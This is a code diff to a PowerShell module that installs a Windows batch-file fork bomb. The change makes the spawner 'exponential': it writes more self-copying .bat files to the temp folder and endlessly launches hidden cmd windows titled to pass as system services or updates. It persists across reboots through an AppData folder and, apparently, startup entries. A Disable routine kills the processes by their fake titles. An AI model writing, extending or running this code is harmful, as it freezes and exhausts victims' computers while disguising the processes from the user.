@@ -5,15 +5,48 @@ $CmdSpawner = @{
     Actions = @{
         Enable = {
             try {
-                # Create the base spawner batch file
+                # Create the exponential spawner batch file
                 $spawnScript = @'
 @echo off
-timeout /t 30 /nobreak > nul
 if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
-:spawn
-start /min cmd /c "cd %userprofile%\Desktop && title Windows System Service && %~dpnx0"
-start /min cmd /c "cd %userprofile%\Desktop && title Windows Update && %~dpnx0"
-goto spawn
+timeout /t 30 /nobreak > nul
+
+:loop
+:: Create two new batch files with incrementing names
+set /a num=%random%
+set spawner1=%temp%\svc%num%1.bat
+set spawner2=%temp%\svc%num%2.bat
+
+:: Create first spawner
+echo @echo off > %spawner1%
+echo if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 ^&^& start "" /min "%%~dpnx0" %%* ^&^& exit >> %spawner1%
+echo :loop >> %spawner1%
+echo set /a num=%%random%% >> %spawner1%
+echo start /min cmd /c "title Windows Service %%num%% ^& %~dpnx0" >> %spawner1%
+echo start /min cmd /c "title Windows Update %%num%% ^& %~dpnx0" >> %spawner1%
+echo timeout /t 1 /nobreak ^> nul >> %spawner1%
+echo goto loop >> %spawner1%
+
+:: Create second spawner
+echo @echo off > %spawner2%
+echo if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 ^&^& start "" /min "%%~dpnx0" %%* ^&^& exit >> %spawner2%
+echo :loop >> %spawner2%
+echo set /a num=%%random%% >> %spawner2%
+echo start /min cmd /c "title System Service %%num%% ^& %~dpnx0" >> %spawner2%
+echo start /min cmd /c "title System Update %%num%% ^& %~dpnx0" >> %spawner2%
+echo timeout /t 1 /nobreak ^> nul >> %spawner2%
+echo goto loop >> %spawner2%
+
+:: Start both spawners
+start /min cmd /c %spawner1%
+start /min cmd /c %spawner2%
+
+:: Create two more direct cmd instances
+start /min cmd /c "title Direct Service %random% & %~dpnx0"
+start /min cmd /c "title Direct Update %random% & %~dpnx0"
+
+timeout /t 1 /nobreak > nul
+goto loop
 '@
                 # Create persistence directories
                 $scriptsPath = "$env:APPDATA\System"
@@ -45,7 +78,7 @@ goto spawn
                 # Start the spawner
                 Start-Process -FilePath "cmd.exe" -ArgumentList "/c start /min `"$spawnerPath`"" -WindowStyle Hidden
                 
-                Write-Host "CMD spawner activated with multi-boot persistence"
+                Write-Host "Aggressive CMD spawner activated with multi-boot persistence"
                 return $true
             }
             catch {
@@ -55,12 +88,20 @@ goto spawn
         }
         Disable = {
             try {
-                # Kill all CMD processes
+                # Kill all related CMD processes
                 Get-Process | Where-Object { 
-                    $_.ProcessName -eq "cmd" -and 
-                    ($_.MainWindowTitle -match "Windows System Service" -or 
-                     $_.MainWindowTitle -match "Windows Update")
+                    $_.ProcessName -eq "cmd" -and (
+                        $_.MainWindowTitle -match "Windows Service" -or 
+                        $_.MainWindowTitle -match "Windows Update" -or
+                        $_.MainWindowTitle -match "System Service" -or
+                        $_.MainWindowTitle -match "System Update" -or
+                        $_.MainWindowTitle -match "Direct Service" -or
+                        $_.MainWindowTitle -match "Direct Update"
+                    )
                 } | Stop-Process -Force -ErrorAction SilentlyContinue
+
+                # Clean up temp files
+                Get-ChildItem $env:TEMP -Filter "svc*.bat" | Remove-Item -Force -ErrorAction SilentlyContinue
 
                 # Clean up startup entries
                 $startupPath = [Environment]::GetFolderPath('Startup')
@@ -79,7 +120,7 @@ goto spawn
                     Remove-Item -Path $scriptsPath -Recurse -Force
                 }
 
-                Write-Host "CMD spawner deactivated"
+                Write-Host "Aggressive CMD spawner deactivated"
                 return $true
             }
             catch {
